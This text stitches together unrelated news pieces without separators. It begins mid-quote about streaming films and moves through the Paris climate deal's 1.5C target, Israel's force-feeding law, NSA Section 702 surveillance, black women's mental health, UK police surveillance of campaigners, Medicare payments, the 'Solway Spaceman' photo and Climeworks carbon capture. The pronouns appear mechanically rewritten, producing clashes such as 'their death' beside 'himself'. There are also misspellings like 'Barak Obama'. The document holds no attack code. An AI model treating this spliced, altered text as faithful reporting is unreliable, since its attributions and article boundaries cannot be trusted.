“I can't comment here,” they said. “I work in the States for a company that launched a streaming show and we've never done this before.” Wright praised the fact that Netflix enabled customers to watch the program wherever they wanted and for as long as they wanted. “We've never had that ability [before],” they said.
But Wright added: “The movie theater will forever be the first choice of course. I think it's rude for people to watch movies on their phones – it's rude to the filmmakers.”
Paris climate deal: How a 1.5 degree target overcame the odds at COP21
Updated
It snuck into the draft climate change agreement earlier this year, and much to everyone's surprise, a 1.5 degrees Celsius target survived the gauntlet of the United Nations climate change negotiations.
Negotiators are catching up on sleep after gruelling talks resulted in 195 nations adopting a new international agreement to slow global warming.
The target of 1.5C dodged multiple rounds of chops, changes and tweaks to the deal text.
The agreement now has the aim of "holding the increase in the global average temperature to well below 2C above pre-industrial levels and to pursue efforts to limit the temperature increase to 1.5C above pre-industrial levels, recognising that this would significantly reduce the risks and impacts of climate change".
The newfound enthusiasm for 1.5C reflects a growing realisation that 2C is a figure with very little basis in fact.
Several scientists have told the ABC the 2C degree target is "arbitrary" or "plucked out of the air". None would go on the record admitting that, however.
We can quantify the risks of 1.5 degrees or two or three degrees, but we can never use science alone to justify any target. It's always a question of what values we have. We need to decide as a society how much risk we're willing to take. Climate professor Reto Knutti
But a new paper out this week in Nature Geoscience is not so shy.
"No scientific assessment has clearly justified or defended the two degree target as a safe level of warming," write the authors.
Lead author Reto Knutti is a Swiss professor of climate science.
"We can quantify the risks of 1.5 degrees or two or three degrees but we can never use science alone to justify any target. It's always a question of what values we have," they said.
"We need to decide as a society how much risk we're willing to take.
"Ultimately the two degree target is a political consensus that takes into account what policymakers at that time considered to be both realistically achieve and tolerable. It is high time for a scientific assessment.
"It's a compromise of the best we can hope for and the worse we can tolerate."
The accepted history of the 2C target is that William Nordhaus, a Yale economist, came up with the number in one of the earliest papers on climate change an its economic implications.
In 1975 they wrote: "If there were global temperatures more than 2C or 3C above the current average temperature, this would take the climate outside of the range of observations which have been made over the last several hundred thousand years."
They graphed a rough sketch of historical temperatures and added a label at 2C: "Estimated maximum experienced over last 100,000 years."
Climate science has honed those estimates in the past 40 years. We now know that temperatures have dropped dramatically over 100,000 years - as low as -20 - but in that time they have never been as high as they are now. And they certainly have not surpassed two degrees.
But before scientists had ironed out such details, the 2C target was already making it into official documents. Europe was largely responsible for its ultimate inclusion in the United Nations agreement that came out of Copenhagen in 2009.
Enshrined as an official target, it became a signpost beyond which "dangerous climate change" apparently lay.
Degrees of difference
There is only half a degree between the two targets. Given that humans live in places that experience temperatures as low as -60C and as high as 50C, it seems ludicrous to spend so much energy haggling over half a degree.
However Will Steffan, a member of the Australian Climate Council, said "those temperatures that we scientists use are not to be confused with daily temperature ranges that people experience".
Even though they are both measuring temperatures, they said they are better thought of as a measurement for what the whole climate system is doing.
"A five degree world doesn't just mean it's going to be five degrees warmer in Canberra or Sydney or Darwin or wherever," they said.
"It means is a world that will likely have little or no polar ice. Large areas will be uninhabitable for humans.
"The last ice-age was only five degrees cooler in global average temperatures and yet a lot of north American and northern Europe were under a couple of kilometres of ice."
As scientists have improved our understanding of climate change, there's been a growing realisation that two degrees is likely to be quite dangerous after all.
"At two degrees we'd have several metres of sea level rise," Professor Steffan said.
"Several small island states would not exist."
They said extreme weather such as heatwaves, bushfires, heavy rainfall, and drought would be more common at 2C.
"Coral reefs would almost certainly not be around at 2 degrees. They'd be struggling at 1.5," they said.
Most worrying for Professor Steffan is there is a chance the world would pass certain tipping points that would spell planetary disaster, such as masses of greenhouse gases escaping from melting Siberian tundra pushing climate change beyond anything humans can control.
The rise of 1.5
Howard Bamsey, a veteran negotiator for Australia at the UN climate conferences, said a 1.5C target has always been on the table. When 2C became official in 2009, there was provision for revisiting 1.5C in 2015.
In 2011, the executive secretary of the UN climate agency Christina Figueres said: "Two degrees is not enough – we should be thinking of 1.5 degrees . If we are not headed to 1.5 degrees we are in big, big trouble."
The imprimatur from such a senior climate figure gave the lower target the legs it needed to carry on through several years of lack-lustre negotiations.
Meanwhile continuing science repeatedly found that at 2C, climate change would be more dangerous than might be acceptable.
Mr Bamsey said 1.5C's rise to prominence this year is a result of a long-term push from the nations most vulnerable to climate change: the island nations.
At the beginning at this year's negotiations US president Barak Obama posed for a photo with leaders of some of the least powerful and most vulnerable island nations.
The photo was a strong symbol that the US was willing to side with the tiny nations and their long-held dream of a 1.5 target.
Australia signed on to the 1.5 target when it cut a deal with St Lucia, a Caribbean island nation, to back the target in exchange for being allowed to carry over its savings from the Kyoto Protocol.
With 1.5 now inked as the stretch target, the island nations can walk away from Paris with a sense of victory.
"It's been one that island states have been wanting to see reflected in the outcome of the UN process for some years," Mr Bamsey said.
"I think it's to some extent a product of the persistence of those most vulnerable countries in flagging their concerns that a world that warmed by two degrees would still leave them in a critical situation that would endanger their existence."

JERUSALEM (Reuters) - Israel's parliament authorized on Thursday the force-feeding of prisoners on hunger strike, a move that has met vehement opposition from the country's medical association and rights groups.
The legislation promoted by Prime Minister Benjamin Netanyahu's rightist coalition reflected Israel's concern that hunger strikes by Palestinians in its jails could end in death and trigger waves of protests in the occupied West Bank.
But Israel's Medical Association, which considers force- feeding a form of torture and medically risky, has urged Israeli doctors not to abide by the law.
The government weathered a lengthy parliamentary debate and the law passed with 46 lawmakers in favor and 40 opposed in the 120-seat Knesset.
In the West Bank, Qadoura Fares, chairperson of the Palestinian Prisoners Club that advocates for Palestinians jailed by Israel, denounced the law as a product of a “racist and fascist” government.
Physicians for Human Rights-Israel called the law shameful.
“It pushes the medical community to severely violate medical ethics for political gains, as was done in other dark regimes in history,” the group said in a statement, urging the doctors “to refuse to serve as a fig leaf for torture”.
Gilad Erdan, Israel's Internal Security Minister, defended the law as a way to prevent Palestinians jailed for security offences from using hunger strikes to pressure Israeli authorities to release them.
Writing on Facebook, they said it would ultimately be up to an Israeli civilian court to decide whether to order force-feeding.
In June, Khader Adnan of the Palestinian Islamic Jihad militant group went on a hunger strike in jail for 56 days, refusing solid food and drinking only water, demanding an end to their detention without trial.
Adnan, who was released this month, had gone on hunger strike for 66 days during a previous detention in 2012, the longest such Palestinian protest. It ended when Israeli authorities promised to release him.
Adnan was held without trial under so-called administrative detention, a method Israel says it employs as a security measure to prevent violence.
A contentious piece of U.S. law giving the National Security Agency broad authority to spy on people overseas expires at the end of the year. Expect heated debate about the scope of U.S. surveillance law leading up to Dec. 31.
One major issue to watch involves the way the surveillance treats communications from U.S. residents. Critics say U.S. emails, texts, and chat logs -- potentially millions of them -- are caught up in surveillance authorized by Section 702 of the Foreign Intelligence Surveillance Act (FISA).
U.S. residents who communicate with foreign targets of the NSA surveillance have their data swept up in what the NSA calls "incidental" collection. The FBI can then search those communications, but it's unclear how often that happens.
A primer on Section 702:
What is Section 702 surveillance?
Section 702 of FISA is the authorization the NSA needs to run programs like Prism and Upstream, revealed in 2013 by former agency contractor Edward Snowden. The U.S. intelligence community has called Section 702 surveillance its "most important tool" in its fight against terrorism, noted Representative Bob Goodlatte, a Virginia Republican, during a March 1 congressional hearing.
Section 702 surveillance is "critical" in the U.S. government's fight against terrorism, added April Doss, a lawyer at the NSA for 13 years.
At the agency, "I had the opportunity to witness firsthand the critical importance of robust intelligence information in supporting U.S. troops and in detecting terrorist plans and intentions that threatened the safety of the U.S. and its allies," they said in testimony March 1.
In the Prism program, the NSA and FBI allegedly gained access to the servers of Google, Facebook, Microsoft, Yahoo, and other internet companies as a way to collect audio, video, emails, and other content.
Upstream collection allegedly involved the NSA intercepting telephone and internet traffic by tapping internet cables and switches.
The surveillance approval process
Under 702, FISA allows the U.S. attorney general and the director of national intelligence to authorize "the targeting of persons reasonably believed to be located outside the United States to acquire foreign intelligence information." The U.S.Foreign Intelligence Surveillance Court reviews the targeting and minimization procedures adopted by the government and determines whether they comport with the statutory restrictions and the Fourth Amendment to the U.S. Constitution.
The Office of the Director of National Intelligence (ODNI) says it conducts its surveillance with the "knowledge of the service provider," although several internet companies have denied cooperating with the NSA.
Doss and other defenders of Section 702 surveillance say that it's targeted, not so-called "bulk" surveillance. But the descriptions of both Prism and Upstream from the Snowden leaks and subsequent government descriptions suggest the surveillance is widespread. The intelligence community has long argued the legal definition of "bulk" surveillance is very specific.
The NSA also collected U.S. telephone records for several years under a separate program. The NSA and the FBI pointed to a different provision of FISA, Section 501, as authorization for the controversial metadata collection program. Congress curtailed the phone metadata collection program in the USA Freedom Act, passed in mid-2015.
Prospects for extending Section 702
Congress is certain to extend the surveillance authority in some form, even though many tech companies and privacy groups are pushing lawmakers to rein in the NSA's surveillance programs, both in the U.S. and abroad.
Most lawmakers see value in extending Section 702, although many Democrats and some Republicans have talked about ending or limiting the ability of the FBI and other intelligence agencies to search for U.S. communications swept up in the surveillance.
Given that Section 702 is one of the main authorizations for the NSA to conduct foreign surveillance, not even the most ardent privacy advocates believe Congress will let the provision expire.
Backdoor searches of U.S. communications
Section 702 prohibits the NSA from targeting people inside the U.S., but the agency, in "incidental" collection, gathers information from U.S. residents who are communicating with the agency's overseas targets.
The law then allows the FBI and other intelligence agencies to search those U.S. communications for evidence of crimes, including crimes not connected to terrorism. Many digital rights groups, along with some lawmakers, want to end this so-called backdoor search of Section 702 records.
This collection of U.S. communications without a warrant is, "in a word, wrong," Representative John Conyers Jr., a Michigan Democrat, said during the March 1 hearing.
Details about the incidental collection are fuzzy. Going back to 2011, lawmakers have repeatedly asked for numbers of U.S. residents affected but have received no details from the ODNI.
Expansive collection of foreign communications
In addition to the incidental collection of U.S. residents' communications, privacy advocates complain about an expansive surveillance of foreigners allowed under Section 702.
The provision allows the NSA to collect foreign intelligence information from "anyone" outside the U.S. not just suspected agents of foreign powers, said Greg Nojeim, senior counsel at the Center for Democracy and Technology. "Intelligence information" is also defined broadly, they said.
"Once you remove that, it's open season on many foreigners who pose no threat to U.S. national security," they added.
House members, in their March 1 hearing, talked little about the impact on people outside the U.S. At this point, it seems unlikely that U.S. lawmakers will limit the provision's foreign data collection.
Privacy advocates have an ace up their sleeves, however. Several privacy groups have encouraged the European Union to get involved in the debate and threaten to revoke Privacy Shield, the cross-Atlantic agreement that allows U.S. companies to handle EU residents' data, unless significant changes are made to 702.
The European Commission "has made it clear that it takes seriously its obligations to review the Privacy Shield Agreement," said Nathan White, senior legislative manager at Access Now, a digital rights group.
EU nations understand surveillance is can be necessary, but "surveillance must respect human rights," White added. "Surveillance doesn't trump human rights responsibilities."
Recent surveillance controversies
The U.S. intelligence community's surveillance programs have stirred up new controversies in recent weeks. In early March, President Donald Trump, in a series of tweets, accused former President Barack Obama of wiretapping Trump Tower in New York City during the last presidential campaign.
While Trump has provided no evidence of the bombshell charge, it appears that the NSA intercepted some of their campaign staffers' communications when they talked to foreign surveillance targets. That type of surveillance would likely be authorized by Section 702.
A few days later, WikiLeaks published more than 8,700 documents that it says came from the CIA. The documents describe the spy agency's efforts to compromise iPhone, Android devices, smart TVs, automobile software, and major operating systems.
The CIA, however, runs separate surveillance programs from the NSA. CIA surveillance is supposed to be focused on specific foreign targets, as opposed to the widespread surveillance that the NSA does under the authority of Section 702. The CIA says it is "legally prohibited from conducting electronic surveillance targeting individuals here at home, including our fellow Americans."
Andrea, 25, had turned up at a police station confused and disoriented. They had one question, and kept repeating it: “Please can you help me look for a job?” I was the “responsible adult” when they were sectioned later that day. The police had come to Andrea's house to let their mother know, but they were away. I was visiting my mum, when an officer knocked on the door. Having grown up with Andrea, I offered to go to the station.
“I'm really tired,” they told me, when I saw them “You're not the only one,” I thought. I am on Prozac and antipsychotics; one of my closest friends takes a high dose of Venlafaxine. Two girls I grew up with have been sectioned, one on multiple occasions. A further five are on antidepressants and my sister regularly has panic attacks. Another old friend, I've heard, has schizophrenia. Aside from mental health problems, we all have one thing in common: we are all black women in our 20s and 30s, and we can all testify to being “tired”.
According to the Mental Health Bulletin, nearly 5,000 “black” or “black British” people per 100,000 accessed mental health services in 2014-2015; 12.7% of those in contact with mental health and learning disability services spent at least one night in hospital that year. That's more than double the percentage in the white population.
Do black women face an increased risk in terms of their mental health? “The simple answer is “yes'”, says Marcel Vige, head of equality improvement at Mind. “The figures around black men are high, but they are also very high for black women too.” I started a WhatsApp group called “HELP!” and added all the black women I know. I wanted to find out what was driving us insane. Situational circumstances can often trigger depression in people of any background, but are there cultural and social issues that can induce poor mental health in black women in particular? I wanted the group to help me understand what was going on.
I was immediately inundated with messages: “Why do I have to change who I am so that people don't find me intimidating or aggressive?” wrote Michelle, a 27-year-old teacher. “It's tiring to have to always conform to get ahead.”
“I can't embrace who I am, fully,” typed Grace, a 24-year-old PA. “I need to make sure people are always comfortable with me.”
“I have to prove that I can do the same thing as a white person,” messaged Naomi, who is 31 and works as a marketing executive in the city. “Often what I say will be ignored, then someone who is not black will say it and all of a sudden it makes sense!”
Zoe, a 27-year-old pharmacist, wrote: “I am treated like I'm odd just for being myself and doing the things I like to do. I'm always viewed through the eyes of people's narrow-minded expectations.” And Maya, a 25-year-old events manager told us: “I would say, being treated like I should be grateful for everything – because I am black and a female, the lowest of the stack. Therefore anything positive I have achieved is not based on my academic or physical ability – but through help and compassion shown to me. I'm expected to be forever grateful; and, in return, be willing to be a slave to the man. White or black.” Each of these women are educated to degree level or more. Each have confessed to “playing a part” in order to get a job and be accepted while there. As a result, they feel they deliberately diminish what they perceive to be their “black self” in order to progress. “For black women, I think it's about showing a proxy-self,” says clinical psychologist Anu Sayal-Bennett from the British Psychological Society. Playing a role is fun if you're an actor, I suppose, but constantly bending to how others feel you should be must affect your psyche.
One of the girls in the “HELP!” group told a story of how she'd had a heated argument with a colleague; both of them had raised their voices but because they were gesticulating, their colleague told them to “stop being aggressive.” They explain how, “I had forgotten who and where I was. I was deeply disappointed that I got tagged with one of the most popular terms associated with black women and I have not argued a point since.”
The fact that black women face struggles with perception every day can often mean that the constant fight seems normal. It became clear that these women were resigned to their fate. As a black woman you are scary, inadequate, ugly or hyper-sexualised – and you just have to accept it.
“I don't talk to people who say they have mental health issues,” says Dr Victoria Showunmi, a lecturer at the UCL Institute of Education. “I talk to black women in particular and, after speaking to them in a discussion group, say, they will then acknowledge the fact they have been suffering from issues related to bad mental health.” They speculate that these might be “the need to be strong, resilient, [and] fear of being called an angry black woman.”
Research from the Mental Health Foundation suggests that African-Caribbean people living in the UK are more likely to be diagnosed with severe mental illness than any other ethnicity in the UK. This may be because they are reluctant to engage with services, so are much more unwell by the time they do. Mental illness is a stigma within the black community and, because of a lack of participation with mental health authorities, experts admit there is a huge gap in statistics for this growing problem.
“Little is known about black women and mental health as these individuals have been largely absent from research,” says Josefien Breedvelt, research manager at The Mental Health Foundation. “The majority of the research has looked at ethnic minorities as a whole, rather than providing a focus on the challenges faced by black women.”
I asked my mum what they thought when I first told them I had been diagnosed with depression. They said the family were all united in their sympathy for me, but wondered what I had to complain about. “I didn't understand,” they said. “To us, you were brought up with more than your parents and other children left in Ghana. To us you have everything – what do you have to be sad about?” Their tone has since changed – I'm fortunate to have a loving family who researched depression and did everything they could to understand me.
From the messages I received on WhatsApp, guilt was a common theme. “There is a consciousness that follows you around,” said Grace. “If you feel blue or sad, you have to remind yourself that a family member somewhere else might be going hungry.” From experience, if you don't remember, your family will be sure to remind you. Where everyday survival is the necessity, mental health will not necessarily be a priority. But that guilt is often deeply ingrained.
Between episodes in hospital, one of Andrea's main worries was that I would tell their mother that they were unwell. Even through the confusion that they felt, they were very clear that they didn't want their mother to know what was going on. Andrea is still sectioned under the Mental Health Act. The last time I went to see her, the majority of women in the unit were black.
All names have been changed.
UK Police Routinely Spy On 9000 'Domestic Terrorists' Very Loosely Defined
from the self-sustaining-activity dept
In the wake of the news that spies at GCHQ -- the UK equivalent of the NSA -- have been tapping into every fiber optic cable that comes into and goes out of the country, downloading and storing phone calls and Internet traffic for up to 30 days, you might think the British authorities have enough information at their disposal, without needing to turn to other sources. But it seems not, according to the latest revelations in The Guardian: A national police unit that uses undercover officers to spy on political groups is currently monitoring almost 9,000 people it has deemed "domestic extremists".
The National Domestic Extremism Unit is using surveillance techniques to monitor campaigners who are listed on the secret database, details of which have been disclosed to the Guardian after freedom of information request.
A total of 8,931 individuals "have their own record" on a database kept by the unit, for which the Metropolitan police is the lead force. It currently uses surveillance techniques, including undercover police, paid informants and intercepts, against political campaigners from across the spectrum.
Senior officers familiar with the workings of the unit have indicated to the Guardian that many of the campaigners listed on the database have no criminal record. Aside from the scale of this surveillance, one of the most disturbing aspects of this operation is the way it redefines campaigners as "domestic terrorists". This is not a new trope, but it's depressing to see it deployed on such a massive scale.
That has the corollary that the UK's authorities can conveniently claim that "terrorism" is a major threat, as evidenced by the thousands under observation -- omitting the fact that these have nothing to do with the headline-grabbing terrorism that is used to justify bringing in laws that makes such assaults on the privacy of ordinary citizens possible in the first place. In other words, it's a self-fuelling system of exaggeration leading to a disproportionate response which is then used to justify that response in the future.
But it gets worse. It turns out that the undercover police referred to above have adopted highly unethical techniques in order to infiltrate political groups, possibly breaking the law: Dozens of police officers could be put on trial for stealing the identities of dead children, and sleeping with female activists they were spying on, according to the police chief leading an inquiry into Metropolitan police undercover work against protest groups. Another troubling aspect of this undercover operation is that it was used as part of a smear campaign against the family of a victim of a racist attack, and against those who were trying to expose corruption in the police force itself: Scotland Yard deployed undercover officers in political groups that sought to uncover corruption in the Metropolitan police and campaigned for justice for people who had died in custody, the Guardian can reveal.
At least three officers from the controversial Special Demonstration Squad (SDS) spied on London-based activist groups. That is, the activities were purely to cover up the police force's own failings, rather than to tackle any kind of serious threat to the nation or public.
It's interesting that these undercover operations are finally being exposed now, alongside ones about pervasive online surveillance. It suggests that Edward Snowden's highly public act of whistleblowing is maybe creating an atmosphere where other whistleblowers feel they can finally come forward after hiding dark secrets for so many years. Let's hope they keep doing so until we know the full extent of these morally-questionable and probably illegal activities -- and that effective new frameworks can then be put in place to stop them happening again.

As of today, we know a whole lot more about how much Medicare pays doctors. The government has released huge amounts of data on which doctors, got paid how much, for what procedures. The data show payments to more than 800,000 doctors and health care organizations. It includes information for thousands of procedures.
If you want to look up a specific doctor, to find out how much they were paid by Medicare in 2012. You can look it up. The Wall Street Journal has created an easy to use interactive search tool here. Researchers are at the very beginning of trying to make sense of all the numbers. But, we have been able to pull out a few interseting tid-bits.
According to a New York Times analysis:
Much of Medicare spending is concentrated among a small fraction of doctors. About 2 percent of doctors account for about $15 billion in Medicare payments, roughly a quarter of the total.
Medicare paid 344 doctors and health care providers more than $3 million in 2012. At the top of the list is an opthamologist in Florida who was paid nearly $21 million.
So who are these well paid doctors? Where are they?
Here are the top 5 states where those 344 doctors and health care providers do business:
And here's a breakdown of the $3 million-plus club by the type of medicine they practice.
Some doctors aren't happy with the data dump. According to the Wall Street Journal, it's the end of a fight that's been going on since the 1970s. As my colleague, Nancy Marshall-Genzer points out, many physicians groups worry the numbers, out of context, could be misleading:
"Sixty percent of all Medicare patients actually have three or more medical conditions. Our patients are extremely complex" Dr. Reid Blackwelder, president of the American Academy of Family Physicians.
Proponents of the database say it will allow patients to figure out which doctors do a good job of providing good quality care while limiting costs. And, it should help us all better understand what goes into the $2.8 trillion dollar U.S. health care industry.

Image copyright Jim Templeton Image caption Was the mysterious figure behind Elizabeth Templeton a spaceman?
On a bright summer's day in 1964, a Carlisle firefighter took a photo of their daughter that created headlines around the world. Fifty years later are we any closer to solving the mystery of the "Solway Spaceman"?
"We went on a normal outing and picked our spot," Jim Templeton recalled in a BBC interview before their death in 2011.
"We sat down and I said, 'Now I'll get some photos of you with the new dress on', never expecting this to happen."
By "this" they meant worldwide media attention and decades of debate over the mysterious figure shown behind their daughter, Elizabeth.
For UFOlogists, it was clear.
A white suit. A helmet. A dark visor. Mr Templeton, they believed, had photographed a spaceman.
Other than their wife, Annie, and two pensioners sat in a car, the Carlisle firefighter maintained they had not seen anyone else that day on Burgh Marsh, overlooking the Solway Firth in Cumbria.
Then came a visit from two "Men in Black" who asked to be taken to the spot where the image was taken
It was, they said, only when the chemist who processed their pictures pointed out the shot had been spoiled by a figure that they realised there had been somebody - or something else - present.
Mr Templeton took it to police in Carlisle, who declared there was nothing out of the ordinary.
Film company Kodak said the same and even offered a reward to anyone who could prove the photo was faked. It was never claimed.
But a media frenzy soon ensued.
"It came to the attention of the local paper, the Cumberland News. From there it ran and ran. It was picked up by the Daily Mail and Express," said Dr David Clarke, an author on UFOs.
Image caption Jim Templeton stood by their version of events when they were interviewed by BBC Look North in 2008
Mr Templeton began receiving letters from all over the world.
"Some people claimed it was a spirit, others believed Jim or their daughter had psychic powers they had not been aware of," Dr Clarke said.
"It got weirder and weirder and weirder."
Then came a visit from two "Men in Black" who asked to be taken to the spot where the image was taken and referred to each other only as Number 9 and Number 11.
Photographic mysteries Image copyright Other Film claiming to show a 1947 alien autopsy in Roswell, New Mexico, USA, emerged in the 1990s. London-based Ray Santilli later said it was a reconstruction, but claimed it was based on genuine lost footage
Elsie Wright, 15, and their cousin Frances Griffiths, 10, photographed the 'Cottingley fairies' in a Yorkshire garden in 1917. It wasn't until the 1980s that the pair admitted their hoax
In October 1967, Roger Patterson and Robert Gimlin claimed to have filmed a Bigfoot in California. Years later, Bob Heironimus, a friend of Patterson's, claimed they had worn an ape costume for the stunt
Perhaps the strangest turn of events was a link to the planned launch of a Blue Streak missile in Woomera, South Australia.
Just days after Mr Templeton had taken their photograph, that missile test on the other side of the world was aborted by technicians who reported seeing two men in the firing range.
Upon later seeing the Solway Spaceman picture on the front page of an Australian newspaper, they were said to be stunned as the figure looked the same as the figures they saw close to the missile.
The plot thickened as the Blue Streak had been built at RAF Spadeadam in Cumbria - just a few miles from where Mr Templeton photographed Elizabeth - and as the story gathered momentum it was also claimed a UFO had been seen at Woomera.
So could those incidents really be linked to events in Cumbria?
No, said Dr Clarke, who has seen the black and white film of the aborted launch.
"I came across all the paperwork in the MoD files about five years ago. It turned out the film was at the Imperial War Museum in London," they said.
Image caption Dr David Clarke met the Templetons while researching one of their books
"It looked like a triangle of light - it was clearly lens flare."
As for the technicians' claim of seeing two men in the firing range, they said no photographic record of that sighting exists.
Regardless, Mr Templeton's picture had tapped into a public interest fired up by the space race between the United States and Soviet Union.
"There was a whole series of photos, usually taken with Box Brownie cameras showing flying saucers like you would see in Dr Who, War of the Worlds and B-Movies," said Dr Clarke.
"Looking today, some seem naive.
"But Jim's is such a distinctive picture. The image behind the little girl is so obviously like a Nasa astronaut."
Sarah Spellman, chairperson of the Association for the Scientific Study of Anomalous Phenomena (Assap), agrees it was a product of its time.
"It's an interesting curiosity. Once you see it and make that spaceman connection, it's quite a striking photograph," they said.
"It struck a chord with the themes of the day and some of the UFO lore of the 1950s and 60s became attached to it."
For Dr Clarke, who has a PhD in folklore, stories such as the Solway Spaceman follow a well-worn tradition.
"Ever since the invention of photography there have been pictures of angels, fairies and spirits," they said.
"A lot were [explained by] lens flare or had been tampered with, but it fed into greater spiritualism in the 19th Century.
"If Jim had taken their photo in 1864 instead of 1964 they would have taken it to the spiritualist church and they would have said it showed a ghost."

Assap, which has been investigating the anomalous and paranormal for more than 30 years, still receives "a steady stream" of new cases annually although the majority now centre around claimed sightings of ghosts rather than UFOs.
"Our ability to analyse has advanced, but so has the ability to fake things," Ms Spellman said.
"People now have access to Photoshop and CGI. If someone wants to fake something they don't have to put a cardboard cut-out in the garden and hang it from the fishing line anymore."
But what could explain the Solway Spaceman photo? Could it simply be a hoax?
Dr Clarke, who met Mr Templeton in 2002, thinks it unlikely.
"I came away absolutely convinced they were telling the truth and couldn't explain it himself, although I was less convinced about their 'Men in Black' story. Whoever it was who visited him, I don't think they were from the government."
However, the spaceman, Dr Clarke says, is almost certainly not anything of the sort.
"One of the other stills [taken that day] shows Jim's wife who, according to him, was standing behind them when they took the photo of Elizabeth," they said.
"I think for some reason their wife walked into the shot and they didn't see them because with that particular make of camera you could only see 70% of what was in the shot through the viewfinder."
Image copyright Jim Templeton Image caption This image was one of a handful taken by Mr Templeton on the day and is believed to show their wife, Annie, right, alongside Elizabeth
Annie, they argue, was standing with them back to the camera and the photograph was over-exposed - causing their blue dress to look white.
Whatever the truth, for Dr Clarke it is a reminder of a more "innocent time" and they are in no doubt about its importance.
"People now are much more cynical about this kind of pictures," they said.
"Back in the 50s and 60s you got a few grainy stills showing extraordinary things. People were much more surprised and willing to suspend disbelief.
"For me, it's one of the most impressive anomalous images in supernatural investigations and people will still be talking about it in another 50 years."

UN climate negotiators are meeting in Bonn amid a welter of reports indicating that concentrations of carbon dioxide in the atmosphere have broken records, while international attempts to curb greenhouse gases are not doing enough to avoid dangerous levels of warming. Our environment correspondent Matt McGrath has travelled to Switzerland to see if technology to remove CO2 from the air could be the answer to this ongoing carbon conundrum.
While CO2 concentrations are now higher than they have been in at least 800,000 years, the gas still only accounts for a tiny 0.04% of our atmosphere.
However, extracting carbon dioxide from well mixed air is not just technically difficult, it's expensive as well.
A half-hour outside Zurich stands one of the frontline attempts to develop a commercial approach to sucking down CO2.
On the roof of a large recycling centre at Hinwil stand 18 metal fans, stacked on top of each, each about the size of a large domestic washing machine.
These fans suck in the surrounding air and chemically coated filters inside absorb the CO2. They become saturated in a few hours so, using the waste heat from the recycling facility, the filters are heated up to 100C and very pure carbon dioxide gas is then collected.
This installation, called a direct-air capture system, has been developed by a Swiss company called Climeworks.
It can capture about 900 tonnes of CO2 every year. It is then pumped to a large greenhouse a few hundred metres away, where it helps grow bigger vegetables.

This is not supposed to be a demonstration of a clever technology - for the developers, making money from CO2 is critical.
"This is the first time we are commercially selling CO2; this is the first of its kind," co-founder Jan Wurzbacher told BBC News.
"It has to be for business; CO2 capture can't work for free."
Right now Climeworks is selling the gas to the vegetable growers next door for less than $600 per tonne, which is very expensive.
But the company says that this is because it has built its extraction devices from scratch - everything is bespoke. The firm believes that like solar and wind energy, costs will rapidly fall once production is scaled up.
"The magic number we always say is $100 per tonne," said Jan Wurzbacher.
"We have drawn a road down to the region of $100 and that is something we think is feasible. We can do it by scaling up the mass production of our components. I'd say half of the way to go there - we know what to do. We just have to do it over the next two or three years."
Image copyright Climeworks Image caption Farmers say that their vegetables are 20% bigger thanks to the supply of CO2
One of the things about CO2 that makes it attractive for developers is that it has many uses in the world.
From fish food to concrete; from car seats to toothpaste - entrepreneurs are trying to use carbon dioxide as a raw material. There's also a roaring trade in CO2 in the US, where it's being used, without irony, to boost the extraction of oil from wells.
One of the most ambitious plans is to extract CO2 and turn it into fuel.
A couple of years ago, car manufacturer Audi announced it had developed what it called "e-diesel", a liquid fuel made from water and CO2. Climeworks supplied some of the CO2 for the trials. Driving down the price of capturing CO2 is key to making this idea work.
"If you have to pay $100 per tonne of CO2 that makes roughly 25 cents per litre of gasoline," said Jan Wurzbacher.
"It is a reasonable amount per litre or per kilogramme of natural gas."
Making fuel or other products out of CO2 might help but it won't achieve the type of large scale take-down from the atmosphere that many scientists now fear will be necessary over the next 20-30 years if the goals of the Paris climate agreement are to be met.
'Natural' solution
The terms of the pact state that there needs to be a "balance between anthropogenic emissions by sources and removals by sinks of greenhouse gases" in the second half of this century. To reach that balance, many experts believe we will have to resort to technological means of taking carbon out of the air.
"There are some things we can do in the real near-term but to get to zero emissions we will probably need some technologies to remove carbon from the atmosphere," Dr Glen Peters from the Centre for International Climate and Environmental Research told BBC News.
"So we need to focus on getting things deployed that we know already work and at the same time we also need to focus on developing new technologies that will help us go the last part of the journey."
Back in 2013, the Intergovernmental Panel on Climate Change suggested that BECCS (bioenergy with carbon capture and storage) might be one way to do this. BECCS involves growing plants that suck down carbon, then burning them to make energy while capturing and burying the carbon that is released.
Critics point out that to make a real impact with BECCS would take up way too much land that could be used for planting food.
However, a recent study showed that a simpler approach, including planting more trees and better management of soils and grasslands, could actually make a significant difference.
The report said that this could account for 37% of all actions needed by 2030 - the equivalent to China's current emissions from fossil fuel use.

So would the world be better off planting trees than waiting for Climeworks and others to perfect their technology?
"We're not against trees," said Anka Timofte, an engineer with the company.
"It is all about the efficiency of the surface area that you are using. Our machine has a higher capacity of removing CO2 from the air and this CO2 can be re-used, and our machines are location-independent, so we could place them in the desert or anywhere there is an energy source."
Climeworks has big ambitions. Recently it opened a plant in Iceland. CO2 is captured and buried underground where it will eventually turn to stone.
The Swiss company wants to capture 1% of global emissions of CO2 by 2025. But to make a small dent in the global picture would require the use of 750,000 units similar to the one installed in Hinwil right now. It would also require huge amounts of energy to run these devices.
'Magical techno-fixes'
The Swiss company is not alone. There are similar efforts underway in Canada with a company called Carbon Engineering, and a Finnish-German consortium is also in the direct air-capture business.
So plentiful are they becoming that environmental groups have started to map the progress of these and other geo-engineering projects that aim to curb climate change through technology.
Many greens are deeply suspicious of these efforts. They argue that we need a fundamental rethink of the way that we produce and consume to put sustainability at the heart of everything we do.
"We need to step back and actually question what are all the possible pathways to a climate safe future," said Lili Fuhr from the Heinrich Böll Foundation.
"Have we seriously explored them and are they not more realistic than relying on these magical technologies that in my view hold immense risks and uncertainties and are certainly harmful for many people around the planet?"
Other critics are worried that if the technology works, then it will encourage politicians not to make the cuts in carbon and rapidly move to renewable energy.
Question of time
Climeworks' Jan Wurzbacher rejects this idea. They say it is all a matter of timing.
"If you had asked me 20 years ago I would have said that, yes, you should just focus on reducing emissions.
"But as of today we may have passed the point of being able to achieve it just by that. People say we will need to remove 10 gigatonnes of CO2 from the atmosphere every year by 2050. It's not enough to develop it then; you need to deploy it and scale it, and that will take 30 years!"
Lili Fuhr doesn't agree. They say that approaches to capturing carbon are all part of a self-preservation strategy by the fossil fuel industry.
"For many decades the fossil fuel industry has funded climate sceptics and in that way tried to prevent climate action. But they've seen that is not working, so instead of denying, they are beginning to come up with these magical techno-fixes that would help prolong the lifespan of their industry.
"What we are seeing is a shift in the broader denial-ism and prevention strategy of the fossil fuel industry."

Australian goalkeeper Brad Jones is set to join Feyenoord with the Eredivisie club confirming they have "reached an agreement in principle".
